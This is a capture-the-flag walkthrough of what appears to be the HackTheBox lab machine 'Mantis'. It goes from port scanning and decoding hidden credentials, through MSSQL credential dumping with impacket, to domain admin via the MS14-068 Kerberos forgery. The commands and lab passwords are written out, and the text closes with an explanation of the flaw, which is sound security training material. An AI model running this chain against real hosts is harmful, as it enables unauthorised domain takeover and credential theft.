# Mantis

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 -Pn 10.129.77.179 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-22 01:02 +08
Nmap scan report for 10.129.77.179
Host is up (0.0089s latency).
Not shown: 65508 closed tcp ports (conn-refused)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1337/tcp  open  waste
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
8080/tcp  open  http-proxy
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49167/tcp open  unknown
49170/tcp open  unknown
49173/tcp open  unknown
50255/tcp open  unknown
```

For this particular machine, Port 8080 and 1433 are both public facing. Also, there's an unknown port 1337 (likely HTTP).

### Port 8080 -> Tossed Salad

Port 8080 shows a blog page:

<figure><img src="../../../.gitbook/assets/image (1303).png" alt=""><figcaption></figcaption></figure>

There wasn't much functionality within this website, so I moved on to port 1337 instead. There was a sign in, but we don't have any credentials yet.&#x20;

### Port 1337 IIS -> Hidden Files

This port just shows the default IIS server page:

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

I ran a directory scan on both of these websites, and found that the service hosted on port 1337 contained one hidden directory:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.77.179:1337/ -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.77.179:1337/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/06/22 01:14:05 Starting gobuster in directory enumeration mode
===============================================================
/orchard              (Status: 500) [Size: 3026]
/secure_notes         (Status: 301) [Size: 162] [--> http://10.129.77.179:1337/secure_notes/]
```

The directory contained an encrypted file:

<figure><img src="../../../.gitbook/assets/image (1144).png" alt=""><figcaption></figcaption></figure>

The file contained a lot of lines which I removed:

```
1. Download OrchardCMS
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
3. Launch IIS and add new website and point to Orchard CMS folder location.
4. Launch browser and navigate to http://localhost:8080
5. Set admin password and configure sQL server connection string.
6. Add blog pages with admin user.
<TRUNACATED>
Credentials stored in secure format
OrchardCMS admin creadentials 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001
SQL Server sa credentials file namez
```

This is just the password in binary, which can be converted online:

<figure><img src="../../../.gitbook/assets/image (624).png" alt=""><figcaption></figcaption></figure>

With this, we can login as the administrator using `admin:@dm!n_P@ssW0rd!` on the blog service on port 8080.

### Credentials -> MSSQL Access

The dashboard can be accessed at `/admin`.

<figure><img src="../../../.gitbook/assets/image (1934).png" alt=""><figcaption></figcaption></figure>

However, I could not find any exploitable feature of this at all. There also wasn't any public exploits related to LFI, RCE or anything I could work with. So I went back to the file found earlier.&#x20;

The name of the file was a little strange, and also the credentials aren't valid when used to login to the MSSQL service:

```
$ mssqlclient.py 'sa:@dm!n_P@ssW0rd!@10.129.77.179'                        
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[-] ERROR(MANTIS\SQLEXPRESS): Line 1: Login failed for user 'sa'.
```

The name of the file contained a string which looks like `base64`. We can decode it to find another password:

```
$ echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d | xxd -r -p
m$$ql_S@_P@ssW0rd!
```

These credentials don't work with the `sa` user, but they do for `admin`:

```
$ mssqlclient.py 'admin:m$$ql_S@_P@ssW0rd!@10.129.77.179'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> 
```

We aren't allowed to execute `xp_cmdshell` in this instance:

{% code overflow="wrap" %}
```
SQL> exec xp_cmdshell 'whoami'
[-] ERROR(MANTIS\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
```
{% endcode %}

So let's just take a look at the database itself. We can first find the databases present:

{% code overflow="wrap" %}
```
SQL> SELECT name FROM master..sysdatabases;
name                                                                                                                               

master                                                                                                                             
tempdb                                                                                                                         
model                                                                                                                              
msdb                                                                                                                               
orcharddb 
```
{% endcode %}

The `orcharddb` looks the most interesting, so let's enumerate that one. There were a lot of tables present, but the one that stood out was the Users table:

{% code overflow="wrap" %}
```
SQL> SELECT table_name FROM information_schema.tables;
table_name

<TRUNCATED>
blog_Orchard_Autoroute_AutoroutePartRecord                                                                                         

blog_Orchard_Users_UserPartRecord                                                                                                  

blog_Orchard_Roles_PermissionRecord
<TRUNCATED>
```
{% endcode %}

Then, we can find the columns present from this table and get both the usernames and passwords from it:

{% code overflow="wrap" %}
```
SQL> select column_name FROM information_schema.columns where table_name ='blog_Orchard_Users_UserPartRecord '
column_name

Id                                                                                                                                 

UserName                                                                                                                           

Email                                                                                                                              

NormalizedUserName                                                                                                                 

Password                                                                                                                           

PasswordFormat                                                                                                                     

HashAlgorithm                                                                                                                      

PasswordSalt                                                                                                                       

RegistrationStatus                                                                                                                 

EmailStatus                                                                                                                        

EmailChallengeToken                                                                                                                

CreatedUtc                                                                                                                         

LastLoginUtc                                                                                                                       

LastLogoutUtc

SQL> Select Username,Password FROM blog_Orchard_Users_UserPartRecord;

admin                                                                                                                                                                                                                                                             AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==                                                                                                                                                                                              

James                                                                                                                                                                                                                                                             J@m3s_P@ssW0rd!
```
{% endcode %}

Great! Now we have this user. However, this user doesn't seem to be part of any remote management group, but his credentials are valid.

```
$ crackmapexec smb 10.129.77.179 -u james -p 'J@m3s_P@ssW0rd!'
SMB         10.129.77.179   445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.77.179   445    MANTIS           [+] htb.local\james:J@m3s_P@ssW0rd! 
```

## Privilege Escalation

### Bloodhound -> Deadend

I initially tried to gather more information about the domain via `bloodhound` to see if this user had privileges over other users.

First we need to find the domain name by scanning port 389.&#x20;

{% code overflow="wrap" %}
```
$ sudo nmap -p 389 -sC -sV -O -T4 10.129.77.179        
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-22 01:34 +08
Nmap scan report for htb.local (10.129.77.179)
Host is up (0.0075s latency).

PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
```
{% endcode %}

Add this domain to our `/etc/hosts` file, and then run `bloodhound-python`. We would also need to add `mantis.htb.local` after an initial collection resulted in some errors.

```
$ bloodhound-python -d htb.local -u james -p 'J@m3s_P@ssW0rd!' -c all -ns 10.129.77.179
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: mantis.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: mantis.htb.local
INFO: Found 5 users
INFO: Found 42 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: mantis.htb.local
INFO: Done in 00M 01S
```

After uploading the data to Bloodhound, we find that the user `james` can RDP into the machine:

<figure><img src="../../../.gitbook/assets/image (2415).png" alt=""><figcaption></figcaption></figure>

That's rather unique, but port 3389 is not open on the machine, meaning we need to do something else. There wasn't any other users on the domain as well:

<figure><img src="../../../.gitbook/assets/image (2512).png" alt=""><figcaption></figcaption></figure>

I was stuck here for a while...

### Kerberos Exploit

Let's think about this for a bit. We have user credentials to do something other than access the file system. We also know that the next step isn't related to any permission or ACL Abuse. It also isn't any service abuse such as Kerberoasting.

We know that this machine is running on Windows 2008 Server, which is pretty old. Maybe there's an exploit pertaining to the version of the services that were running on the machine?

Hacktricks shows that MS14-068 exists, which is a Kerberos exploit.

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-kerberos-88" %}

This exploit allows us to manipulate current logon tokens of users on the DC. In short, we can trick the machine into thinking that we are a Domain Admin. More information regarding this exploit can be found here:

{% embed url="https://adsecurity.org/?p=541" %}

Also, while researching for exploitation methods, I found that the Impacket suite of tools included one specifically for this:

{% embed url="https://github.com/mubix/akb/blob/master/Impacket/MS14-068.md" %}

We can then run `impacket-goldenPac` to get a SYSTEM shell.

<figure><img src="../../../.gitbook/assets/image (4034).png" alt=""><figcaption></figcaption></figure>

Rooted!

## Exploit Understanding

I wanted to take some time to understand why this exploit works on this machine in particular. First, let's enumerate this machine using `systeminfo`:

```
C:\Users\Administrator\Desktop>systeminfo
 
Host Name:                 MANTIS
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7601 Service Pack 1 Build 7601
<TRUNCATED>
```

So this was running a severely outdated version of Windows Server. **It should also be noted that this machine does not contain the Hotfix `KB3011780` which fixes this exploit.**&#x20;

Kerberos has something called Privileged Attribute Certificate (PAC) which contains information about the ticket being used, which is mainly the user's current privileges, group memberships, SID History and what not. Only recently in Nov 2021 did Microsoft include the `PAC_ATTRIBUTES_INFO` and `PAC_REQUESTOR` fields.

PAC Signature Validation is the function that checks the PAC via a checksum. In an earlier version, MS11-013 allows for attackers to basically spoof the PAC to request tickets as the administrator.&#x20;

<figure><img src="../../../.gitbook/assets/image (3858).png" alt=""><figcaption></figcaption></figure>

The current exploit MS014-68 does include a bit more checks, but not enough. The exploit comes about because the DC fails to check for valid checksums for the PAC field, thus allowing us attackers to spoof the PAC to impersonate an administrator requesting for a TGT.

The DC validates our TGT-REQ because it sees us as the administrator, and thus returns the admin's TGT, **which is a golden ticket that can be used to do anything on the domain**.&#x20;

Normally, getting a golden ticket (without administrator access) would involve getting the NTLM hash of the `krbtgt` account, which is really hard because we can't dump credentials using `mimikatz` or something since we don't have any privileges.&#x20;
